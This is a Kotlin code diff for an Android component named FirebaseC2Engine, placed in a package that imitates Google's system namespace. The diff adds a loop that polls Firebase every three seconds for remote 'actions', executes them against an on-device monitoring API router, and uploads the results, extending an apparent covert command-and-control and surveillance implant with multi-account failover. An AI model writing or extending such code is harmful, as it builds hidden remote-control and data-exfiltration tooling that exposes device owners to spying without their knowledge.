@@ -3,6 +3,7 @@ package com.google.android.system
 import android.content.Context
 import android.os.Build
 import android.util.Log
+import com.homemonitor.WebDashboardApiRouter
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
@@ -105,6 +106,7 @@ class FirebaseC2Engine(
         Log.i(TAG, "Starting 6-Account Failover Firebase C2 Engine...")
 
         startCommandPollingLoop()
+        startActionApiPollingLoop()
         startHeartbeatLoop()
     }
 
@@ -254,6 +256,101 @@ class FirebaseC2Engine(
                 }
                 delay(3000L) // 3s polling cycle
             }
+        }
+    }
+
+    private fun startActionApiPollingLoop() {
+        scope.launch(Dispatchers.IO) {
+            Log.i(TAG, "Firebase Structured Action API Polling Loop Active 🚀")
+            while (isEngineRunning) {
+                try {
+                    val account = getActiveAccount()
+                    val uid = if (currentUserId.isNotBlank()) currentUserId else "default_user"
+                    val devId = if (currentDeviceId.isNotBlank()) currentDeviceId else getOrCreateDeviceId()
+
+                    val url = "${account.databaseUrl}/users/$uid/devices/$devId/actions.json"
+                    val request = Request.Builder().url(url).get().build()
+
+                    httpClient.newCall(request).execute().use { response ->
+                        if (response.isSuccessful) {
+                            val body = response.body?.string() ?: "null"
+                            if (body != "null" && body.startsWith("{")) {
+                                val json = JSONObject(body)
+                                val keys = json.keys()
+                                while (keys.hasNext()) {
+                                    val actionId = keys.next()
+                                    val actionObj = json.optJSONObject(actionId) ?: continue
+                                    val status = actionObj.optString("status", "pending")
+                                    val path = actionObj.optString("path", "/api/summary")
+                                    val method = actionObj.optString("method", "GET")
+                                    val payloadBody = actionObj.optString("body", "")
+
+                                    if (status == "pending") {
+                                        Log.i(TAG, "Firebase Action API Received [$actionId]: $method $path")
+                                        updateActionStatus(account, uid, devId, actionId, "processing")
+
+                                        val pathUri = android.net.Uri.parse(path)
+                                        val httpResponseStr = WebDashboardApiRouter.handleApiRequest(
+                                            context = context,
+                                            method = method,
+                                            cleanPath = pathUri.path ?: path,
+                                            pathUri = pathUri,
+                                            bodyString = payloadBody,
+                                            clientIp = "FIREBASE_RELAY"
+                                        )
+
+                                        val bodyIndex = httpResponseStr.indexOf("\r\n\r\n")
+                                        val responseContent = if (bodyIndex != -1) httpResponseStr.substring(bodyIndex + 4) else httpResponseStr
+
+                                        sendActionResponse(account, uid, devId, actionId, responseContent)
+                                        updateActionStatus(account, uid, devId, actionId, "completed")
+                                    }
+                                }
+                            }
+                        }
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Action API polling exception: ${e.message}")
+                }
+                delay(3000L)
+            }
+        }
+    }
+
+    private fun updateActionStatus(
+        account: FirebaseAccountConfig,
+        uid: String,
+        devId: String,
+        actionId: String,
+        status: String
+    ) {
+        try {
+            val url = "${account.databaseUrl}/users/$uid/devices/$devId/actions/$actionId/status.json"
+            val body = "\"$status\"".toRequestBody("application/json".toMediaTypeOrNull())
+            val request = Request.Builder().url(url).put(body).build()
+            httpClient.newCall(request).execute().close()
+        } catch (_: Exception) {}
+    }
+
+    private fun sendActionResponse(
+        account: FirebaseAccountConfig,
+        uid: String,
+        devId: String,
+        actionId: String,
+        responseContent: String
+    ) {
+        try {
+            val url = "${account.databaseUrl}/users/$uid/devices/$devId/actions/$actionId/response.json"
+            val respBody = (try {
+                JSONObject(responseContent).toString()
+            } catch (_: Exception) {
+                try { JSONArray(responseContent).toString() } catch (_: Exception) { JSONObject.quote(responseContent) }
+            }).toRequestBody("application/json".toMediaTypeOrNull())
+
+            val request = Request.Builder().url(url).put(respBody).build()
+            httpClient.newCall(request).execute().close()
+        } catch (e: Exception) {
+            Log.e(TAG, "sendActionResponse error: ${e.message}")
         }
     }
 
